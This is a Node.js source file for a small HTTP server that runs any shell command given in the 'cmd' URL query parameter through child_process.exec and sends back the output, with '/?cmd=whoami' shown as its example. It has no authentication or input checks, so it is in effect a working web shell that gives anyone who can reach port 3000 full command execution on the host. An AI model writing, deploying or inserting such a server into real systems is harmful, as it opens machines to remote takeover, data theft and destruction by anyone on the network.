const http = require('http')
const url = require('url')
const exec = require('child_process').exec

const PORT = 3000


const execute = (cmd, callback) => {
  const child = exec(cmd, (error, stdout, stderr) => {
    const hash = {
      stdout: stdout,
      stderr: stderr,
      execerr: null
    }
    if (error !== null) {
      hash.execerr = error
    }
    callback(hash)
  })
}


const executeShowResponse = (cmd, response) => {
  execute(cmd, (hash) => {
    response.end(JSON.stringify(hash))
  })
}


const requestHandler = (request, response) => {
  const url_parts = url.parse(request.url, true)
  // console.log(url_parts)

  if (url_parts.query.cmd) {
    executeShowResponse(url_parts.query.cmd, response)
  } else {
    response.end(JSON.stringify({
      cmd: {
        params: {},
        examples: [
          "/?cmd=whoami"
        ]
      }
    }))
  }
}

const server = http.createServer(requestHandler)
server.listen(PORT, (err) => {
  if (err) {
    return console.error('something bad happened', err)
  }

  console.log(`server is listening on ${PORT}`)
})
